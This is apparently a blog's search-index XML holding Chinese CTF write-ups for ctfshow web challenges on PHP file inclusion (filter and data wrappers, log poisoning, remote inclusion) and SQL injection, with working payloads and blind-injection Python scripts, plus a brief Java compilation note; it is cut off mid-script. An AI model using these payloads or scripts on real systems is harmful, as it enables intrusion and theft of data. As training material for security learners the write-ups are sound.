<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<p>java编译过程：</p><p>Java源代码 ——（编译）——&gt; Java字节码 ——（解释器）——&gt; 机器码</p><p>Java源代码 ——（编译器 ）——&gt; jvm可执行的Java字节码 ——（jvm解释器） ——&gt; 机器可执行的二进制机器码 ——&gt;程序运行</p><p>采用字节码的好处：高效、可移植性高</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>include文件包含，payload：<br><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="variable">$file </span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了php，那么就不能使用php伪协议了，playload：</p><p>data://协议</p><blockquote><p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&#x27;tac flag.???&#x27;);?&gt;</span><br><span class="line">?file=data://text/plain;base64,PD89IHN5c3RlbSgndGFjIGZsYWcuPz8/Jyk7Pz4=</span><br><span class="line">逗号后面是要执行的php代码的base64加密形式</span><br><span class="line"> </span><br><span class="line">注：data://可以用data:代替</span><br></pre></td></tr></table></figure><p>大小写绕过（str_replace区分大小写、str_ireplace不区分）<br>playload：Php://input</p><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="variable">$file </span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file </span>= <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了php与data。</p><h3 id="方式1大小写绕过"><a href="#方式1大小写绕过" class="headerlink" title="方式1大小写绕过"></a>方式1大小写绕过</h3><p>同样可以利用大小写绕过使用Php://input执行php代码。</p><h3 id="方式2日志文件包含"><a href="#方式2日志文件包含" class="headerlink" title="方式2日志文件包含"></a>方式2日志文件包含</h3><p>日志文件记录了服务器收到的每一次请求的</p><p>IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号会自动进行url编码，存到日志当中时，不是一个正确的php语句，无法成功执行，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。</p><p>访问日志的位置和文件名在不同的系统上会有所差异</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apache一般是/var/log/apache/access.log</span><br><span class="line">apache2一般是/var/log/apache2/access.log</span><br><span class="line">nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</span><br></pre></td></tr></table></figure><p>这个Linux的nginx日志文件路径是/var/log/nginx/access.log，要在用文件包含漏洞读取日志文件的同时，修改ua头为我们想要执行的命令(burp中go要点两次才能执行命令，第一次将代码写入日志，第二次执行代码</p><p>且操作一定不能出问题，如果报错就要销毁容器从头再来。因为php语法错误后不再解释执行后面代码，语法错误后，后面不管语法对不对都不执行了。我们包含了日志文件，如果日志文件中我们插入了错误的php代码，那么我们再次执行对的代码时会先执行那个错误的php代码，因为报错，所以后面正确的就不会执行了。</p><p>在ua写入playload：<code>&lt;?php system(&quot;tac flag.php&quot;); ?&gt;</code></p><h3 id="方式3远程文件包含"><a href="#方式3远程文件包含" class="headerlink" title="方式3远程文件包含"></a>方式3远程文件包含</h3><p>远程文件包含可以包含其他主机上的文件，并当成php代码执行。<br>要实现<code>远程</code>文件包含的话，php配置的<code>allow_url_include = on</code>必须为on</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?file=http://***.***.***.***/1.txt     1.txt里面写入代码。</span><br></pre></td></tr></table></figure><h2 id="Web81"><a href="#Web81" class="headerlink" title="Web81"></a>Web81</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="keyword">include</span>(<span class="variable">$file</span>);&#125;<span class="keyword">else</span>&#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><p>分析：因为过滤了冒号，所以远程文件包含和大小写绕过不行了，只能用日志包含</p><h2 id="WEB82-session文件包含"><a href="#WEB82-session文件包含" class="headerlink" title="WEB82-session文件包含"></a>WEB82-session文件包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>比较常规的题目不做讲解了，这里给出payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查数据库</span></span><br><span class="line">payload = <span class="string">&quot;-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+&quot;</span></span><br><span class="line"><span class="comment"># 查列名</span></span><br><span class="line">payload=<span class="string">&quot;-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user&#x27; --+&quot;</span></span><br><span class="line"><span class="comment"># 查flag</span></span><br><span class="line">payload=<span class="string">&quot;-1&#x27;union select id,username,password from ctfshow_user --+&quot;</span></span><br></pre></td></tr></table></figure><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>第二题,首先从题目提示当中看出查询的数据不包含flag，并且给出了数据库是ctfshow_user2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>从结果看出只有两列尝试闭合括号<code>-1&#39; union select 1,2 --+</code>有回显成功，返回逻辑告诉我们不能有flag字段，所以尝试编码很多啦hex等等，这里用base64吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>-1&#39; union select to_base64(username),hex(password) from ctfshow_user2 --+</code><br>查询出最后一行解码就是flag啦</p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>和上一道题一样的，唯一区别就是这道题是三列回显数据,这次改hex函数呗，随意一点多一个姿势<br><code>1&#39; union select id,hex(username),hex(password) from ctfshow_user3--+</code><br>可以看见最后一行，解码就行，给个在线解码网址，<a href="https://www.bejson.com/convert/ox2str/">点我</a><br><img src="https://img-blog.csdnimg.cn/20201125212133657.png#pic_center" alt="在这里插入图片描述"></p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>通过抓包，发现关键网站<br><code>http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v3.php?page=1&amp;limit=10</code><br>但是没有回显，有点懵逼，想到这道题是第四题尝试改为<code>v4.php</code>好家伙有回显了<br><code>http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1</code><br>之后我想到了利用盲注的方式来读取表格，这里采用了二分法，感兴趣的师傅可以看看我都脚本，这里采用了二分法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1&#x27; and &quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;1=if(ascii(substr((select  password from ctfshow_user4 limit 24,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0) -- -&#x27;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>这次没回显了,我测试一下时间盲注，发现没问题哈<br><code>http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1&#39; and if(1=1,sleep(3),1)--+&amp;page=1&amp;limit=10</code>,写个二分法的时间盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1&#x27; and &quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0) -- -&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload, timeout=<span class="number">0.5</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>利用读写文件写入网站根目录<br><code>http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1&#39; union select 1,password from ctfshow_user5 into outfile &#39;/var/www/html/1.txt&#39;--+&amp;page=1&amp;limit=10</code><br>之后访问<code>http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/1.txt</code></p><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>万能密码呗，噗嗤<br><code>1&#39; or 1=1--+</code>然后最后一行发现了<code>flag</code></p><h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>首先输入，发现返回出错，估计是有过滤<br><code>1&#39; union select 1,2,3--+</code><br>尝试大小写<br><code>1&#39; uNion sElect 1,2,3--+</code>发现有回显了<br>然后直接查flag<br><code>1&#39; uNion sElect 1,2,password from ctfshow_user --+</code></p><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>空格过滤了<code>/**/</code>绕过<br><code>1&#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#39;flag&#39;%23</code></p><h2 id="web-178"><a href="#web-178" class="headerlink" title="web 178"></a>web 178</h2><h3 id="解法一-2"><a href="#解法一-2" class="headerlink" title="解法一"></a>解法一</h3><p>过滤了空格与*号等用<code>%09</code>绕过<br><code>1&#39;%09union%09select%091,2,3%23</code><br>之后一把梭得到flag<code>1&#39;%09union%09select%091,2,password%09from%09ctfshow_user%23</code></p><h3 id="解法二-2"><a href="#解法二-2" class="headerlink" title="解法二"></a>解法二</h3><p>老规矩一句话，其实上面很多题都可以懒得写<br><code>id=1&#39;or&#39;1&#39;=&#39;1&#39;%23</code></p><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><h3 id="解法一-3"><a href="#解法一-3" class="headerlink" title="解法一"></a>解法一</h3><p>一句话梭哈<br><code>id=1&#39;or&#39;1&#39;=&#39;1&#39;%23</code></p><h3 id="解法二-3"><a href="#解法二-3" class="headerlink" title="解法二"></a>解法二</h3><p>这次还把<code>%09</code>过滤了，测试了下发现<code>%0c</code>可以绕过<br>所以<code>1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</code></p><h2 id="web180-182"><a href="#web180-182" class="headerlink" title="web180-182"></a>web180-182</h2><p>把所有空格都过滤了，考虑其他姿势，暂时只想到这个，欢迎师傅评论区补充,然后还可以盲注，这里不放脚本了，太懒了<br><code>id=-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>首先看提示需要post传参<code>tableName=ctfshow_user</code>发现有回显<br>这里写了个脚本跑出来就ok</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://57496c50-1b0d-40de-ac22-501e93a1ddbd.chall.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">flagstr = <span class="string">r&quot;&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">f&quot;(ctfshow_user)where(substr(pass,<span class="subst">&#123;i&#125;</span>,1))regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>过滤的太多了，<code>right join</code>连接查询即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f15ac2ca-94b7-4257-a52a-00e52ecee805.chall.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span>  j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;i&#125;</span>,1)regexp(char(<span class="subst">&#123;j&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><p>给大家分享一张图片<br><img src="https://img-blog.csdnimg.cn/20201127190309995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>这道题过滤了数字，可以在此基础上加上<code>true</code><br>上脚本呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://341e93e1-a1e7-446a-b7fc-75beb0e88086.chall.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">f&quot;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,<span class="subst">&#123;createNum(i)&#125;</span>,<span class="subst">&#123;createNum(<span class="number">1</span>)&#125;</span>)regexp(char(<span class="subst">&#123;createNum(j)&#125;</span>)))&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.text.find(<span class="string">&quot;$user_count = 43;&quot;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j) != <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(flag.lower())</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(j) == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><p>和上一题一样的，不多说</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 